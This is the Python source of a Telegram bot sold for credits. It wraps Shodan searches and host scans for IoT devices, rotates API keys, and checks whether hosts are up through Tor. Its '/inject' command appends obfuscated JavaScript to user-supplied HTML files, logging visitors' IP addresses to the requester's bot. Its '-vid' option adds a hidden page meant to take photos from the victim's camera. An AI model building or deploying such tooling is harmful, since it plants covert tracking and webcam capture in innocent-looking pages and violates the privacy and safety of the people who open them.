import telebot
import shodan
import random
import time
import os
import requests
import json
import socket
import threading
import subprocess
from db import DataBase
import jsobf
import socks

def changer():
    global sshodan
    global nowk
    tokens = ''''''.split('\n')
    while True:
        time.sleep(3)
        sshodan = shodan.Shodan(random.choice(tokens))
        nowk = random.choice(tokens)

def pingthread(id_,bot,host):
    
    t = time.time()
    ip,port = host.split(':')
    port=int(port)
    print(ip,port)
    
    while time.time()-t<2*24*60*60:
        time.sleep(15)
        try:
            s = socks.socksocket()
            s.set_proxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
            print('Proxy setted')
            s.settimeout(4)
            print("Timeout setted")
            print('Connecting')
            s.connect((ip,port))
            print('connected')
            bot.send_message(id_,f"Host, {host} is running!!!")
            break
        except Exception as er:
            print(er)
        

def fromjson(n,out_=True):
    return str(json.dumps(n,indent=3))

def findshodan(page,name,fn):
    global sshodan
    out = ''
    try:
        print(sshodan.info())
        z = 'https://www.shodan.io/search?query='+name+'&key='+nowk+'&page='+page
        print(z)
        out = requests.get(z).content
        open('reqs/'+fn+'output.html','wb').write(out)
        print('Saved to','reqs/'+fn+'output.html')
        return 0
    except Exception as e:
        print(e)
        return 'Error;((( Try again or make other request'

def getfn():
    return hex(random.randint(2**31,2**32))[2:]

global sshodan,nowk
threading.Thread(target=changer).start()

bot = telebot.TeleBot('')
@bot.message_handler(commands=['shodan'])
def button_message(message):
    print('shodan')
    global sshodan

    mstext = message.text.split()
    data = ' '.join(mstext[1:len(mstext)])
    id_ = message.from_user.id
    cid = message.chat.id
    fn = getfn()

    try:
        user_o = DataBase.GetUser(id_)
    except Exception as e:
        print('New user',id_)
        print(e)
        user_o = DataBase.AddUser(id_)
    
    if user_o.balance >= 1:
        user_o.balance-=1
        user_o.save()
        
        name = ' '.join(data.split()[1:len(data)])
        no_mininfo_name = name.replace(' --mininfo','')
        count = sshodan.count(no_mininfo_name)['total']
        page = mstext[1]
        print(page)
        
        bot.send_message(cid,f'{count} results found!')
        
        
        if count != 0:
            if  ' -mininfo' in data:
                name = name.replace(' -mininfo','')
                bot.send_message(cid,'Wait plz...')
                
                x = '\n'.join([result['ip_str']+':'+str(result['port']) for result in sshodan.search(name,page=page)['matches']])
                open('reqs/'+fn+'output.txt','w').write(x)
                
                bot.send_document(cid,open('reqs/'+fn+'output.txt','rb'))
                bot.send_message(cid,'Your balance: '+str(users_.users[thisuser].balance))
                
                users_.save()
                os.remove('reqs/'+fn+'output.txt')
            else:

                x = findshodan(page,name,fn)

                bot.send_document(cid,open('reqs/'+fn+'output.html','rb'))
                bot.send_message(cid,f'Your balance: {user_o.balance}')
                os.remove('reqs/'+fn+'output.html')
            
        
    else:
        bot.send_message(cid,'Not enought balance to make request. \nSend message @shodan_support about this problem')


@bot.message_handler(commands=['scan'])
def button_message(message):
    global sshodan


    mstext = message.text.split()
    data = ' '.join(mstext[1:len(mstext)])
    id_ = message.from_user.id
    cid = message.chat.id
    fn = getfn()


    try:
        user_o = DataBase.GetUser(id_)
    except Exception as e:
        print(e)
        print('New user',id_)
        user_o = DataBase.AddUser(id_)

    if user_o.balance >= 0.5:
        user_o.balance-=0.5
        user_o.save()
        try:
            bot.send_message(cid,'Scanning')
            
            data = socket.gethostbyname(data)
            sshodan.scan(data)
            time.sleep(5)
            
            info_ = fromjson(sshodan.host(data))
            open('reqs/'+fn+'output.txt','w',encoding='utf-8').write(info_)
            bot.send_document(cid,open('reqs/'+fn+'output.txt','rb'))
            os.remove('reqs/'+fn+'output.txt')
            
        except:
            bot.send_message(cid,'Error;((( Try again or make other request')
    else:
        bot.send_message(cid,'Not enought balance to make request. \nSend message @shodan_support about this problem')


@bot.message_handler(commands=['me'])
def button_message(message):
    id_ = message.from_user.id
    cid = message.chat.id
    
    try:
        user_o = DataBase.GetUser(id_)
    except Exception as e:
        print('New user',id_)
        user_o = DataBase.AddUser(id_)

    bot.send_message(cid,f'Balance: {user_o.balance}\nId: {id_}')

@bot.message_handler(commands=['waitup'])
def button_message(message):
    id_ = message.from_user.id
    cid = message.chat.id
    
    try:
        user_o = DataBase.GetUser(id_)
    except Exception as e:
        print('New user',id_)
        user_o = DataBase.AddUser(id_)

    if user_o.balance >= 1:
        user_o.balance-=1
        user_o.save()
    else:
         bot.send_message(cid,'Not enought balance to make request. \nSend message @shodan_support about this problem')
         return
        
    host = message.text.split()[1]
    print(host)
    threading.Thread(target=pingthread,args=(cid,bot,host)).start()
        
@bot.message_handler(commands=['setreqs'])
def button_message(message):
    id_ = message.from_user.id
    if id_ == 7791626202:
        args = message.text.split()[1:]
        to_id = args[0]
        bal = args[1]

        user_o = DataBase.GetUser(to_id)
        user_o.balance = bal
        user_o.save()

@bot.message_handler(commands=['getreqs'])
def button_message(message):
    id_ = message.from_user.id
    if id_ == 7791626202:
        args = message.text.split()[1:]
        to_id = args[0]

        try:
            user_o = DataBase.GetUser(to_id)
            bot.send_message(id_,f'{user_o.id_} has {user_o.balance} requests')
        except Exception as e:
            bot.send_message(id_,f'{to_id} hasn\'t been created')

@bot.message_handler(commands=['inject'])
def inject_command_handle(message):
    cmd = message.text.split()[1:]
    token = cmd[0]
    cid = message.chat.id
    
    bot.send_message(cid,
                     'Send me html file to inject iplogger')

    u_v=False
    
    if '-vid' in message.text:
        u_v=True
        
    bot.register_next_step_handler(message,inject_handle,tok=token,video=u_v)
    

def inject_handle(message,tok,video):
    doc = message.document
    id_=message.from_user.id
    cid = message.chat.id
    
    if doc.file_name.endswith('html') and doc.mime_type == 'text/html':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        downloaded_file+=jsobf.gentext(id_,tok).encode()
        if video:
            print(video)
            downloaded_file+=open('tests/obfcam.html').read().encode()
            
        fn = getfn()+'output.html'
        open('reqs/'+fn,'wb').write(downloaded_file)
        bot.send_document(cid,open('reqs/'+fn,'rb'))
    else:
        bot.send_message(cid,'This is not html file...')
    
@bot.message_handler(commands=['start'])
def button_message(message):
    cid = message.chat.id
    str_ = '''
/shodan finds Iot devices using shodan api.
Syntax - /shodan 1 port:3000
ᅟᅟᅟᅟ               ^  {~~~~~~~~~}
ᅟᅟᅟᅟ              page     ^
ᅟᅟᅟᅟ                   request
Balance -= 1

Also you can use argument -mininfo to see just ips and ports.

/scan finds info about host(using ip or domen)
Syntax - /scan google.com
ᅟᅟᅟᅟ             {~~~~~~~~~~}
ᅟᅟᅟᅟ                 ^
ᅟᅟᅟᅟ              request
Balance -= 0.5

/me shows your account info


/inject injects ip logger to html file
Syntax - /inject bot_token
                         {~~~~~~~~}
                             ^
                         request
use -vid to get photo from dest camera

This command is free!!!

To get more requests, you should send a message to the person with the username @shodan_support
@sshosint is our channel!!!
'''
    bot.send_message(cid,str_)

print('Bot started')
bot.infinity_polling()
